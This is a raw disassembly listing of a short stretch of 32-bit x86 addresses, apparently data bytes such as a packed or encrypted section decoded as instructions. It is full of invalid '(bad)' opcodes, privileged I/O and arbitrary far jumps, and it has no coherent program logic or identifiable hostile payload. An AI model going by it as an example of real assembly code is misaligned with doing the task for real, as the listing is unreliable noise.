  40f5c3:	cmp    DWORD PTR [ebp+0x58],0x93a5383
  40f5ca:	repz jl 0x40f565
  40f5cd:	mov    WORD PTR [esi],?
  40f5cf:	int    0x78
  40f5d1:	scas   al,BYTE PTR es:[edi]
  40f5d2:	js     0x40f577
  40f5d4:	(bad)  
  40f5d5:	in     eax,0x0
  40f5d7:	mov    cl,0x29
  40f5d9:	dec    edx
  40f5da:	or     esp,eax
  40f5dc:	inc    edx
  40f5dd:	fcom   QWORD PTR [edi]
  40f5df:	xchg   esi,eax
  40f5e0:	inc    eax
  40f5e1:	daa    
  40f5e2:	pop    esp
  40f5e3:	add    eax,0x687c16ff
  40f5e8:	fidiv  DWORD PTR [edx-0x40cf5427]
  40f5ee:	push   0x4fec2594
  40f5f3:	les    esi,FWORD PTR [ecx]
  40f5f5:	xchg   ebp,eax
  40f5f6:	push   ecx
  40f5f7:	pop    ds
  40f5f8:	push   0xe47182c0
  40f5fd:	js     0x40f5e3
  40f5ff:	mov    edi,0xa59484b0
  40f604:	fwait
  40f605:	icebp  
  40f606:	adc    BYTE PTR [edi-0x5e],dh
  40f609:	mov    eax,0x1453ac65
  40f60e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f60f:	ins    DWORD PTR es:[edi],dx
  40f610:	mov    ds,WORD PTR [ecx+0x2767e171]
  40f616:	test   al,dh
  40f618:	push   esi
  40f619:	sbb    al,ah
  40f61b:	pusha  
  40f61c:	add    ecx,esi
  40f61e:	ins    DWORD PTR es:[edi],dx
  40f61f:	jmp    0x9336c137
  40f624:	loope  0x40f5cb
  40f626:	aad    0x9a
  40f628:	lahf   
  40f629:	in     al,dx
  40f62a:	or     BYTE PTR [eax+0x7e691594],0x2f
  40f631:	shr    esi,0xd6
  40f634:	xor    bl,BYTE PTR [ebp+0x462d22a4]
  40f63a:	into   
  40f63b:	mov    cl,0x17
  40f63d:	or     BYTE PTR [ebx-0x62cf31a3],dh
  40f643:	bound  esp,QWORD PTR [ebx]
  40f645:	push   ebx
  40f646:	in     eax,dx
  40f647:	loopne 0x40f629
  40f649:	jge    0x40f6b8
  40f64b:	(bad)  
  40f64c:	aas    
  40f64d:	dec    edx
  40f64e:	mov    dl,al
  40f650:	mov    ecx,0x250431f4
  40f655:	fstp   QWORD PTR [edx-0x5a14b036]
  40f65b:	inc    edx
  40f65c:	out    dx,al
  40f65d:	inc    ebp
  40f65e:	lods   al,BYTE PTR ds:[esi]
  40f65f:	loopne 0x40f5e6
  40f661:	mov    ?,WORD PTR ds:0x60fedb64
  40f667:	mov    esp,0xb263f399
  40f66c:	sbb    DWORD PTR [ebx],eax
  40f66e:	xchg   edx,eax
  40f66f:	lahf   
  40f670:	cmp    BYTE PTR [ecx+0x57e23249],0x31
  40f677:	adc    dl,BYTE PTR [edx+0x3]
  40f67a:	jge    0x40f616
  40f67c:	mov    al,0x5d
  40f67e:	push   0x962ec45b
  40f683:	dec    ebp
  40f684:	jnp    0x40f6eb
  40f686:	dec    edx
  40f687:	mov    WORD PTR [eax],?
  40f689:	xchg   ebx,eax
  40f68a:	outs   dx,DWORD PTR ds:[esi]
  40f68b:	push   0xffffffba
  40f68d:	cmp    ah,dl
  40f68f:	imul   ecx,DWORD PTR [edi+0xd],0x7f87149d
  40f696:	and    DWORD PTR [ecx-0x61e5d4fc],ecx
  40f69c:	fs mov eax,0xe239bdec
  40f6a2:	cmp    al,0xd6
  40f6a4:	and    eax,0xfaf558d4
  40f6a9:	add    BYTE PTR [esi],ch
  40f6ab:	sub    esp,DWORD PTR [edi]
  40f6ad:	lahf   
  40f6ae:	or     BYTE PTR [esi-0x62c72c43],al
  40f6b4:	ja     0x40f6de
  40f6b6:	dec    ecx
  40f6b7:	(bad)  [ecx-0x3b898e7a]
  40f6bd:	scas   eax,DWORD PTR es:[edi]
  40f6be:	ret    0x83d4
  40f6c1:	mov    ah,0x54
  40f6c3:	js     0x40f694
  40f6c5:	and    DWORD PTR [edx-0x48],esi
  40f6c8:	rol    DWORD PTR [esp+edx*4-0xb4dbb43],0xc7
  40f6d0:	into   
  40f6d1:	icebp  
  40f6d2:	sub    eax,0x78351d02
  40f6d7:	mov    eax,0x1faab07
  40f6dc:	jbe    0x40f6fe
  40f6de:	mov    bl,BYTE PTR [esi]
  40f6e0:	cmp    eax,0x48e31bb5
  40f6e5:	cs sbb al,0x97
  40f6e8:	cwde   
  40f6e9:	and    cl,BYTE PTR [ecx-0x10737bfd]
  40f6ef:	dec    edi
  40f6f0:	into   
  40f6f1:	mov    eax,0x811b7338
  40f6f6:	cmp    bl,BYTE PTR [edi]
  40f6f8:	push   0xffffffa8
  40f6fa:	mov    al,ds:0x197a68b0
  40f6ff:	jnp    0x40f6ff
  40f701:	dec    eax
  40f702:	ins    DWORD PTR es:[edi],dx
  40f703:	inc    eax
  40f704:	pop    ebx
  40f705:	retf   0x656d
  40f708:	(bad)  
  40f709:	mov    eax,0x73f4a1d2
  40f70e:	inc    esi
  40f70f:	in     al,dx
  40f710:	sbb    BYTE PTR [eax+ebp*4+0x4b0c94a9],dl
  40f717:	sar    DWORD PTR [ebx],1
  40f719:	and    BYTE PTR [esi+0x4486d7e2],0xcb
  40f720:	dec    esi
  40f721:	stos   DWORD PTR es:[edi],eax
  40f722:	xchg   edi,eax
  40f723:	arpl   WORD PTR [edx+0x53af0bd5],di
  40f729:	out    dx,al
  40f72a:	repz ja 0x40f6fb
  40f72d:	das    
  40f72e:	sub    eax,0x65caed89
  40f733:	call   0x83c8:0xe239a639
  40f73a:	test   bh,bh
  40f73c:	pop    eax
  40f73d:	aad    0xbb
  40f73f:	inc    ebp
  40f740:	mov    eax,ds:0xfa065c1d
  40f745:	and    eax,0x805186ba
  40f74a:	outs   dx,BYTE PTR ds:[esi]
  40f74b:	inc    ebp
  40f74c:	(bad)  [edi+0x51b9a90c]
  40f752:	inc    edi
  40f753:	dec    esi
  40f754:	mov    ch,0x64
  40f756:	into   
  40f757:	push   ebp
  40f758:	mov    esi,0x5b135d1e
  40f75d:	data16 jne 0x40f727
  40f760:	xchg   ebx,eax
  40f761:	cli    
  40f762:	clc    
  40f763:	cld    
  40f764:	fdiv   st(6),st
  40f766:	sub    bh,BYTE PTR [edi]
  40f768:	xor    DWORD PTR [ecx+0x4dac33dc],ecx
  40f76e:	xor    DWORD PTR [eax],0x35
  40f771:	retf   0x8485
  40f774:	jp     0x40f769
  40f776:	lods   eax,DWORD PTR ds:[esi]
  40f777:	dec    esi
  40f778:	hlt    
  40f779:	nop
  40f77a:	inc    BYTE PTR [edx+ebx*2]
  40f77d:	leave  
  40f77e:	inc    edx
  40f77f:	or     edi,DWORD PTR [ecx]
  40f781:	lea    esi,[esi]
  40f783:	int3   
  40f784:	ror    BYTE PTR [ebp-0x6b],cl
  40f787:	jg     0x40f7e2
  40f789:	xchg   ecx,eax
  40f78a:	dec    eax
  40f78b:	xor    al,BYTE PTR [ebx-0x58]
  40f78e:	(bad)  
  40f78f:	xchg   esi,eax
  40f790:	mov    ebx,0xb8d7f090
  40f795:	push   ss
  40f796:	xchg   ebp,eax
  40f797:	int3   
  40f798:	jle    0x40f727
  40f79a:	mov    bh,0x63
  40f79c:	stos   DWORD PTR es:[edi],eax
  40f79d:	scas   eax,DWORD PTR es:[edi]
  40f79e:	adc    DWORD PTR [ebp+0x50233767],esp
  40f7a4:	fisubr WORD PTR [eax-0x72]
  40f7a7:	(bad)  
  40f7a8:	ds cs sbb eax,0x424d9b5f
  40f7af:	inc    edx
  40f7b0:	shr    DWORD PTR [ebp-0x4109be77],1
  40f7b6:	sbb    eax,ebx
  40f7b8:	or     al,0x57
  40f7ba:	mov    DWORD PTR [ecx],ebx
  40f7bc:	gs sub al,0x89
  40f7bf:	jnp    0x40f7e7
  40f7c1:	sub    al,0x1a
  40f7c3:	rcl    edx,cl
  40f7c5:	ja     0x40f803
  40f7c7:	xor    edx,DWORD PTR [edi-0x6e71d2b0]
  40f7cd:	sub    bh,0x2c
  40f7d0:	icebp  
  40f7d1:	add    ecx,DWORD PTR [eax]
  40f7d3:	push   edi
  40f7d4:	xor    DWORD PTR [ecx-0x56],esi
  40f7d7:	jmp    0x233c:0xcc17dfcc
  40f7de:	lods   al,BYTE PTR ds:[esi]
  40f7df:	shl    BYTE PTR [ebp-0x6f863907],0xb4
  40f7e6:	test   al,0x9
  40f7e8:	lea    edx,[esi]
  40f7ea:	and    ebx,esp
  40f7ec:	sub    BYTE PTR [edx+edx*1],cl
  40f7ef:	out    dx,eax
  40f7f0:	adc    DWORD PTR [edi+ebp*2+0x3895d930],0x44
  40f7f8:	repnz dec ebx
  40f7fa:	jns    0x40f7f4
  40f7fc:	pop    ebp
  40f7fd:	jo     0x40f78c
  40f7ff:	repz gs adc bh,ch
  40f803:	inc    esp
  40f804:	lahf   
  40f805:	fdiv   QWORD PTR [edx+0xa]
  40f808:	ds and al,0xc3
  40f80b:	adc    BYTE PTR ds:[ebx-0x7d2c3f4a],0x3e
  40f813:	sub    al,0xa3
  40f815:	xor    eax,0xcc674ab8
  40f81a:	stos   BYTE PTR es:[edi],al
  40f81b:	call   0x1a477110
  40f820:	or     DWORD PTR [eax-0x4f1c3100],ecx
  40f826:	pop    ds
  40f827:	lahf   
  40f828:	xor    BYTE PTR [eax],bh
  40f82a:	push   cs
  40f82b:	test   BYTE PTR [edi+0xb7efde7],0xc3
  40f832:	adc    al,0xbb
  40f834:	mov    ecx,0x66b7ca7c
  40f839:	cmp    DWORD PTR [ecx-0x2500811d],eax
  40f83f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f840:	mov    BYTE PTR [edx],0x7e
  40f843:	sti    
  40f844:	xor    eax,0x5c0eac76
  40f849:	mov    esi,0x48512f84
  40f84e:	popf   
  40f84f:	std    
  40f850:	setno  BYTE PTR [ebx+ecx*2]
  40f854:	add    al,0x8c
  40f856:	add    BYTE PTR [edx+0x696ca278],bl
  40f85c:	push   ss
  40f85d:	mov    esi,0x2bc4ecc6
  40f862:	mov    al,0x5e
  40f864:	inc    esi
  40f865:	(bad)  
  40f866:	lds    esi,FWORD PTR [esi-0x4a]
  40f869:	adc    bh,cl
  40f86b:	fild   QWORD PTR [ecx-0x3d0a6f77]
  40f871:	xchg   edi,eax
  40f873:	fwait
  40f874:	dec    eax
  40f875:	fwait
  40f876:	test   eax,0xce166a90
  40f87b:	cmp    ebp,DWORD PTR [edx]
  40f87d:	adc    dh,cl
  40f87f:	pop    eax
  40f880:	jl     0x40f88c
  40f882:	call   0xb44e0093
  40f887:	push   es
  40f888:	and    al,0x60
  40f88a:	jno    0x40f8d8
  40f88c:	mov    DWORD PTR [ebx],edx
  40f88e:	and    al,0x95
  40f890:	fistp  QWORD PTR [ebx-0x179961cc]
  40f896:	inc    edx
  40f897:	push   esp
  40f898:	in     al,0x16
  40f89a:	or     DWORD PTR [eax-0x2af044b8],eax
  40f8a0:	xor    dh,BYTE PTR [esi]
  40f8a2:	pop    ebx
  40f8a3:	sahf   
  40f8a4:	(bad)  
  40f8a5:	lods   al,BYTE PTR ds:[esi]
  40f8a6:	mov    edx,ecx
  40f8a8:	fldenv [eax]
  40f8aa:	push   edi
  40f8ab:	outs   dx,BYTE PTR ds:[esi]
  40f8ac:	mov    al,ds:0x2b73df17
  40f8b1:	xor    BYTE PTR [edi+0x3e741874],0x7
  40f8b8:	adc    BYTE PTR [ebx],al
  40f8ba:	sub    al,0x63
  40f8bc:	jg     0x40f8cc
  40f8be:	fwait
  40f8bf:	mov    ds:0xf0eb40ef,al
  40f8c4:	inc    esi
  40f8c5:	(bad)  
  40f8c6:	sub    eax,DWORD PTR [ecx+0x67929dd5]
  40f8cc:	mov    edx,0x873270bd
  40f8d1:	sbb    al,0x21
  40f8d3:	mov    dh,0xd8
  40f8d5:	push   edx
  40f8d6:	sbb    BYTE PTR [edi-0x6393de4e],dl
  40f8dc:	push   ss
  40f8dd:	mov    ds:0x768e8d2c,eax
  40f8e2:	sub    al,0x74
  40f8e4:	mov    DWORD PTR [ebx],ebx
  40f8e6:	fnop   
  40f8e8:	stos   DWORD PTR es:[edi],eax
  40f8e9:	fidiv  WORD PTR [ebp-0xe92b6d]
  40f8ef:	xor    DWORD PTR [eax+0x52d6e4a9],0x7e
  40f8f6:	and    esp,edx
  40f8f8:	ret    0xff21
  40f8fb:	out    dx,eax
  40f8fc:	in     al,dx
  40f8fd:	das    
  40f8fe:	out    0x4a,al
  40f900:	add    eax,0xe74ff7dd
  40f905:	add    bl,BYTE PTR [esi-0x51]
  40f908:	jbe    0x40f93c
  40f90a:	data16 test al,0x68
  40f90d:	xor    al,0x6c
  40f90f:	push   ds
  40f910:	sahf   
  40f911:	pop    ds
  40f912:	(bad)  
  40f913:	leave  
  40f914:	cld    
  40f915:	addr16 aaa 
  40f917:	ins    BYTE PTR es:[edi],dx
  40f918:	jns    0x40f92d
  40f91a:	shl    al,0xac
  40f91d:	sbb    DWORD PTR [esi],0x30
  40f920:	cmp    DWORD PTR [eax-0x2d],ecx
  40f923:	and    al,0xe2
  40f925:	mov    dh,0xcb
  40f927:	mov    ah,0x66
  40f929:	enter  0xa632,0x9b
  40f92d:	xchg   esi,eax
  40f92e:	jmp    0x40f974
  40f930:	adc    al,0x3a
  40f932:	xor    eax,0x25e10ec4
  40f937:	xchg   esp,eax
  40f938:	cmp    al,0x5
  40f93a:	add    DWORD PTR [esp+ecx*2+0x39bd61f9],edx
  40f941:	fs loop 0x40f926
  40f944:	nop
  40f945:	jns    0x40f8dc
  40f947:	outs   dx,DWORD PTR ds:[esi]
  40f948:	sub    al,bh
  40f94a:	xor    dh,BYTE PTR cs:[edi]
  40f94d:	adc    dl,cl
  40f94f:	fild   DWORD PTR [edi+ebx*2]
  40f952:	or     ecx,esi
  40f954:	or     eax,0x5ebf994a
  40f959:	or     al,0xfe
  40f95b:	clc    
  40f95c:	ins    BYTE PTR es:[edi],dx
  40f95d:	aad    0x8a
  40f95f:	mov    eax,ds:0x5a3fab2a
  40f964:	dec    esp
  40f965:	stc    
  40f966:	dec    eax
  40f967:	(bad)  
  40f968:	mov    es,edx
  40f96a:	ficom  DWORD PTR [ecx+esi*4-0x3c]
  40f96e:	test   al,0xfb
  40f970:	push   esi
  40f971:	addr16 cmc 
  40f973:	mov    eax,0x9328153d
  40f978:	mov    esp,0x955a30a3
  40f97d:	push   edx
  40f97e:	sti    
  40f97f:	jge    0x40f9e4
  40f981:	ds push edx
  40f983:	and    al,0x22
  40f985:	cmp    cl,BYTE PTR [ebp-0x2c73eb72]
  40f98b:	jg     0x40f96b
  40f98d:	popa   
  40f98e:	mov    al,ds:0xf76479e6
  40f993:	sar    DWORD PTR [ecx+0x1f],0xaa
  40f997:	daa    
  40f998:	or     BYTE PTR [ecx+0x75bd324c],dl
  40f99e:	cmp    dh,BYTE PTR [edi]
  40f9a0:	jecxz  0x40f96c
  40f9a2:	repnz mov esi,0x291a824a
  40f9a8:	dec    edi
  40f9a9:	mov    cl,0xca
  40f9ab:	mov    eax,0x4ca13996
  40f9b0:	adc    cl,BYTE PTR [edx+0x547560ee]
  40f9b6:	mov    bh,0x6
  40f9b8:	xor    eax,0x3335efa9
  40f9bd:	inc    ebp
  40f9be:	int    0x6b
  40f9c0:	sub    al,0x2
  40f9c2:	and    ecx,ecx
  40f9c4:	mov    edx,0x9bfa008f
  40f9c9:	ret    0xce28
  40f9cc:	lock les edx,FWORD PTR [ebp+0x18]
  40f9d0:	mov    eax,0xe9269f92
  40f9d5:	and    BYTE PTR es:[eax+0x6c],0x8d
  40f9da:	jae    0x40fa40
  40f9dc:	xor    bl,BYTE PTR [ecx+0x3c]
  40f9df:	aaa    
  40f9e0:	pushf  
  40f9e1:	adc    bh,ah
  40f9e3:	fisub  DWORD PTR [eax-0x5d]
  40f9e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9e7:	out    0xe9,al
  40f9e9:	mov    edi,0xf080afcd
  40f9ee:	lahf   
  40f9ef:	xor    ebx,ebx
  40f9f1:	jae    0x40f975
  40f9f3:	jnp    0x40f9e5
  40f9f5:	ror    DWORD PTR [esi],1
  40f9f7:	shr    cl,1
  40f9f9:	ror    DWORD PTR [edi+edx*2-0x77],1
  40f9fd:	int3   
  40f9fe:	ficomp DWORD PTR [edi]
  40fa00:	fs in  eax,0xb5
  40fa03:	addr16 mov cl,0xe9
  40fa06:	js     0x40fa44
  40fa08:	adc    dl,0xb4
  40fa0b:	xchg   esi,eax
  40fa0c:	je     0x40f9f5
  40fa0e:	mov    edi,0x8f52c2f4
  40fa13:	sbb    DWORD PTR [ebx+0x1ef65e48],ebp
  40fa19:	clc    
  40fa1a:	sbb    ch,BYTE PTR [ebx-0x4e]
  40fa1d:	or     esp,ebp
  40fa1f:	test   al,0x4c
  40fa21:	jecxz  0x40f9d0
  40fa23:	dec    edx
  40fa24:	jg     0x40fa74
  40fa26:	jae    0x40fa11
  40fa28:	repnz imul DWORD PTR [ebx]
  40fa2b:	repz (bad) 
  40fa2d:	popf   
  40fa2e:	add    BYTE PTR [ebx-0x36a783b8],ah
  40fa34:	call   0xb92c:0x31b47958
  40fa3b:	outs   dx,DWORD PTR ds:[esi]
  40fa3c:	xor    DWORD PTR [ebp-0x58eca031],ebx
  40fa42:	mov    DWORD PTR [eax],esp
  40fa44:	into   
  40fa45:	cwde   
  40fa46:	jns    0x40fa6f
  40fa48:	adc    ebp,DWORD PTR [edi+edx*4]
  40fa4b:	add    BYTE PTR [ecx],dh
  40fa4d:	and    eax,0x77481478
  40fa52:	add    al,0x6e
  40fa54:	cmp    eax,0x49a8f651
  40fa59:	les    eax,FWORD PTR [di+0xdd1]
  40fa5e:	gs sbb al,0x42
  40fa61:	(bad)  
  40fa62:	lea    ebx,[edx+0x70]
  40fa65:	cs aad 0x29
  40fa68:	pop    esp
  40fa69:	cmp    BYTE PTR [ecx+0x66fc68ff],cl
  40fa6f:	pop    eax
  40fa70:	push   edx
  40fa71:	cmp    ebx,ebx
  40fa73:	pusha  
  40fa74:	or     DWORD PTR ds:0x825f1d14,ebp
  40fa7a:	jge    0x40facc
  40fa7c:	out    dx,eax
  40fa7d:	mov    ds:0x8036266,al
  40fa82:	aaa    
  40fa83:	mov    eax,0x187c5ff7
  40fa88:	sbb    eax,0x19840fad
  40fa8d:	push   cs
  40fa8e:	leave  
  40fa8f:	or     esp,edi
  40fa91:	fwait
  40fa92:	pusha  
  40fa93:	cmp    ebx,ecx
  40fa95:	call   DWORD PTR [ebx]
  40fa97:	outs   dx,DWORD PTR ds:[esi]
  40fa98:	je     0x40fa6b
  40fa9a:	mov    ds:0xd9c87825,eax
  40fa9f:	cli    
  40faa0:	je     0x40faae
  40faa2:	test   eax,0xe543851f
  40faa7:	mov    dh,0x7b
  40faa9:	sahf   
  40faaa:	dec    esp
  40faab:	int    0xd0
  40faad:	pop    ebx
  40faae:	es (bad) 
  40fab1:	pushf  
  40fab2:	lahf   
  40fab3:	pop    ebx
  40fab4:	cmp    eax,0x13adb3a1
  40fab9:	fstp   TBYTE PTR [ebp+0x39]
  40fabc:	xchg   BYTE PTR [ebx+0x60ea6d49],al
  40fac2:	daa    
  40fac3:	xor    dh,BYTE PTR [esi+0x2d]
  40fac6:	dec    edx
  40fac7:	and    ecx,0x51d4f7fb
  40facd:	ss pop ds
  40facf:	jb     0x40fac8
  40fad1:	jns    0x40fb4f
  40fad3:	mov    ebp,ss
  40fad5:	fs cld 
  40fad7:	into   
  40fad8:	aaa    
  40fad9:	xchg   esi,eax
  40fada:	jae    0x40fa93
  40fadc:	adc    cl,dh
  40fade:	inc    ebx
  40fadf:	jb     0x40fb23
  40fae1:	fs cwde 
  40fae3:	jmp    0x6e30:0xbf200966
  40faea:	cdq    
  40faeb:	scas   al,BYTE PTR es:[edi]
  40faec:	inc    ebx
  40faed:	enter  0xeb1e,0xf3
  40faf1:	pop    ebx
  40faf2:	mov    bl,0x16
  40faf4:	fstp   QWORD PTR [esi+esi*1+0x7e7f73bb]
  40fafb:	fsub   QWORD PTR [edx+0x3fca74e0]
  40fb01:	mov    WORD PTR ds:0x61d204b5,ss
  40fb07:	inc    ebp
  40fb08:	xor    ch,BYTE PTR [edi-0x24783e4e]
  40fb0e:	lea    ecx,[edi]
  40fb10:	rcl    DWORD PTR ds:[esp+ebp*1],cl
  40fb14:	leave  
  40fb15:	dec    esp
  40fb16:	push   ds
  40fb17:	push   ebx
  40fb18:	and    al,0x7c
  40fb1a:	cld    
  40fb1b:	dec    esi
  40fb1c:	push   edi
  40fb1d:	int    0x4e
  40fb1f:	adc    al,BYTE PTR [eax+ebx*2-0x44]
  40fb23:	test   DWORD PTR [ecx+0x43],ecx
  40fb26:	popa   
  40fb27:	fist   WORD PTR [edx]
  40fb29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb2a:	ds jmp 0x40fae5
  40fb2d:	aaa    
  40fb2e:	pop    es
  40fb2f:	jae    0x40fb21
  40fb31:	(bad)  
  40fb32:	data16 jg 0x40faf0
  40fb35:	mov    cl,0x5d
  40fb37:	xor    DWORD PTR [eax],0xffffffb6
  40fb3a:	jb     0x40fad0
  40fb3c:	push   ebp
  40fb3d:	loope  0x40fb03
  40fb3f:	mov    esi,0x82c69bb0
  40fb44:	lock xchg esp,eax
  40fb46:	sub    eax,0x4aad9350
  40fb4b:	cwde   
  40fb4c:	mov    DWORD PTR [esi],eax
  40fb4e:	iret   
  40fb4f:	mov    ecx,0x2573131b
  40fb54:	push   ds
  40fb55:	iret   
  40fb56:	sub    al,0xda
  40fb58:	sub    ebp,DWORD PTR [ebp+ecx*8-0x75]
  40fb5c:	mov    dh,0xc
  40fb5e:	inc    ecx
  40fb5f:	mov    dl,0xf8
  40fb61:	jne    0x40fbd4
  40fb63:	daa    
  40fb64:	sbb    eax,0x12c71fa8
  40fb69:	nop
  40fb6a:	cmp    bl,BYTE PTR [edi+edi*8+0x39a35199]
  40fb71:	leave  
  40fb72:	xor    al,0xe3
  40fb74:	push   cs
  40fb75:	fisubr DWORD PTR cs:[ebp+0x3147631c]
  40fb7c:	push   0xa2bfe954
  40fb81:	ffreep st(2)
  40fb83:	sbb    esi,DWORD PTR ds:0x12a90987
  40fb89:	adc    al,cl
  40fb8b:	jo     0x40fb8f
  40fb8d:	pushf  
  40fb8e:	pop    ebx
  40fb8f:	pop    esp
  40fb90:	push   edi
  40fb91:	xor    eax,0x2fb2f0a5
  40fb96:	shl    DWORD PTR [edx+0x4a51225e],cl
  40fb9c:	and    ebx,ebx
  40fb9e:	xchg   ebp,eax
  40fb9f:	out    dx,eax
  40fba0:	or     BYTE PTR [ebp-0x20],ch
  40fba3:	int3   
  40fba4:	ret    0x862a
  40fba7:	lods   al,BYTE PTR ds:[esi]
  40fba8:	dec    edx
  40fba9:	sub    edx,ebx
  40fbab:	aas    
  40fbac:	xlat   BYTE PTR ds:[ebx]
  40fbad:	call   0x45fe:0x3a8bbe6a
  40fbb4:	adc    al,0xb5
  40fbb6:	jo     0x40fc10
  40fbb8:	dec    edx
  40fbb9:	ret    0x6c19
  40fbbc:	jl     0x40fbac
  40fbbe:	idiv   edx
  40fbc0:	pop    eax
  40fbc1:	retf   
  40fbc2:	test   BYTE PTR [eax-0x7127b48b],ah
  40fbc8:	pop    esi
  40fbc9:	mov    ebx,0x80349dbe
  40fbce:	sti    
  40fbcf:	je     0x40fc2f
  40fbd1:	mov    ch,0xf2
  40fbd3:	add    dh,dl
  40fbd5:	xchg   esp,eax
  40fbd6:	or     DWORD PTR [eiz*1-0x6e4c5442],ecx
  40fbdd:	and    edx,ecx
  40fbdf:	adc    eax,0x4acd4240
  40fbe4:	mov    al,BYTE PTR [edi]
  40fbe6:	test   BYTE PTR [edx-0x4f],0x38
  40fbea:	mov    edx,0xedcaf87a
  40fbef:	jl     0x40fc6e
  40fbf1:	adc    eax,0x3bcdc7f2
  40fbf6:	loope  0x40fc32
  40fbf8:	add    ecx,DWORD PTR [ecx]
  40fbfa:	in     eax,dx
  40fbfb:	scas   al,BYTE PTR es:[edi]
  40fbfc:	scas   al,BYTE PTR es:[edi]
  40fbfd:	jo     0x40fc5e
  40fbff:	push   es
  40fc00:	loopne 0x40fc4b
  40fc02:	fistp  QWORD PTR [ecx+0x117f4171]
  40fc08:	dec    ebx
  40fc09:	fidivr WORD PTR [edx+0x2e]
  40fc0c:	retf   0xfe71
  40fc0f:	jne    0x40fc3b
  40fc11:	aaa    
  40fc12:	js     0x40fbe9
  40fc14:	or     ah,dh
  40fc16:	mov    ah,0x28
  40fc18:	xor    esi,esp
  40fc1a:	mov    BYTE PTR [esi+0x31],dl
  40fc1d:	cdq    
  40fc1e:	lods   eax,DWORD PTR ds:[esi]
  40fc1f:	xchg   ecx,eax
  40fc20:	push   ds
  40fc21:	mov    bl,0xf9
  40fc23:	pop    es
  40fc24:	dec    edi
  40fc25:	les    ecx,FWORD PTR ss:[ebp+eax*8-0x67]
  40fc2a:	(bad)  
  40fc2b:	pop    ebp
  40fc2c:	xchg   edi,eax
  40fc2d:	enter  0x73b,0xe6
  40fc31:	mov    edx,DWORD PTR [ecx]
  40fc33:	jae    0x40fc77
  40fc35:	and    dl,cl
  40fc37:	cld    
  40fc38:	or     bl,0x42
  40fc3b:	popa   
  40fc3c:	stos   DWORD PTR es:[edi],eax
  40fc3d:	cmp    BYTE PTR [edx],0x6f
  40fc40:	add    al,BYTE PTR [ebp+0x74981bea]
  40fc46:	xchg   esp,eax
  40fc47:	adc    DWORD PTR [edx+0x7bf59745],ebp
  40fc4d:	push   ebp
  40fc4e:	rcl    BYTE PTR [edi+0x69],cl
  40fc51:	test   eax,0x8a085a4f
  40fc56:	dec    eax
  40fc57:	icebp  
  40fc58:	loope  0x40fcc8
  40fc5a:	int    0xf3
  40fc5c:	test   eax,0xfdca2f1
  40fc61:	adc    dh,dh
  40fc63:	shl    DWORD PTR [ecx+0x366c72c9],0xb3
  40fc6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc6b:	fwait
  40fc6c:	inc    ebp
  40fc6d:	pop    ds
  40fc6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc6f:	sbb    eax,DWORD PTR [ebx-0x15d680fd]
  40fc75:	add    ebx,esi
  40fc77:	les    edx,FWORD PTR [edi-0x1d]
  40fc7a:	jae    0x40fc46
  40fc7c:	popa   
  40fc7d:	jmp    0xc19e2864
  40fc82:	jp     0x40fc1a
  40fc84:	cwde   
  40fc85:	push   esi
  40fc86:	inc    ecx
  40fc87:	jne    0x40fc96
  40fc89:	inc    edx
  40fc8a:	mov    dl,0xec
  40fc8c:	loopne 0x40fc7e
  40fc8e:	stos   BYTE PTR es:[edi],al
  40fc8f:	popa   
  40fc90:	(bad)  
  40fc91:	ds push esp
  40fc93:	pop    ebx
  40fc94:	test   eax,0x376e8336
  40fc99:	cmp    dh,dl
  40fc9b:	ja     0x40fce3
  40fc9d:	aam    0x1f
  40fc9f:	sbb    DWORD PTR [ebp-0x60139c92],0xfcc92cee
  40fca9:	jecxz  0x40fc9b
  40fcab:	aaa    
  40fcac:	int    0x36
  40fcae:	mov    ah,BYTE PTR [esi+0x12f2709b]
  40fcb4:	add    bh,dh
  40fcb6:	hlt    
  40fcb7:	test   BYTE PTR [edx-0x6fd6e6a8],ch
  40fcbd:	xor    eax,0x605b4891
  40fcc2:	int3   
  40fcc3:	dec    edi
  40fcc4:	cld    
  40fcc5:	jecxz  0x40fd2b
  40fcc7:	(bad)
  40fcca:	sub    al,0x42
  40fccc:	imul   DWORD PTR [ebp+0x13]
  40fccf:	cmp    bh,0xdb
  40fcd2:	retf   0xf5a8
  40fcd5:	adc    eax,0xa4187d0e
  40fcda:	popf   
  40fcdb:	inc    esp
  40fcdc:	pop    eax
  40fcdd:	cld    
  40fcde:	sub    eax,0x28f819e8
  40fce3:	cmp    al,0x47
  40fce5:	nop
  40fce6:	sbb    ah,BYTE PTR [eax+0x15d59d82]
  40fcec:	mov    esp,0xe49ee1f6
  40fcf1:	int    0x5b
  40fcf3:	call   0x8ff0ca35
  40fcf8:	sbb    edi,DWORD PTR [ebp-0x4]
  40fcfb:	sahf   
  40fcfc:	fsubrp st(1),st
  40fcfe:	cmp    DWORD PTR [ebp*1-0x4307e33e],ebp
  40fd05:	jmp    0x40fcf7
  40fd07:	(bad)  
  40fd08:	iret   
  40fd09:	xchg   esi,eax
  40fd0a:	sahf   
  40fd0b:	(bad)
  40fd0e:	xor    al,BYTE PTR [edx+0x33]
  40fd11:	xor    DWORD PTR gs:[ebx-0x29],ebx
  40fd15:	pop    edx
  40fd16:	rcr    ebp,cl
  40fd18:	adc    BYTE PTR [eax-0x67],0xa1
  40fd1c:	pop    ebx
  40fd1d:	sbb    esi,eax
  40fd1f:	int    0x90
  40fd21:	scas   al,BYTE PTR es:[edi]
  40fd22:	(bad)  
  40fd23:	retf   0xbe54
  40fd26:	dec    esp
  40fd27:	mov    WORD PTR [ecx],cs
  40fd29:	sbb    BYTE PTR ds:0x11fd9536,bl
  40fd2f:	aas    
  40fd30:	in     eax,0xe
  40fd32:	out    0xcf,eax
  40fd34:	iret   
  40fd35:	int    0xb0
  40fd37:	lgs    eax,FWORD PTR [ecx]
  40fd3a:	fcomp  DWORD PTR [ebx+0x1c]
  40fd3d:	nop
  40fd3e:	push   edx
  40fd3f:	sbb    ebx,ebx
  40fd41:	inc    edi
  40fd42:	add    eax,0x7be9086c
  40fd47:	jecxz  0x40fd75
  40fd49:	in     al,0x84
  40fd4b:	out    dx,eax
  40fd4c:	(bad)  
  40fd4d:	and    esp,ebx
  40fd4f:	mov    ah,0x12
  40fd51:	in     eax,0xf9
  40fd53:	adc    edi,esi
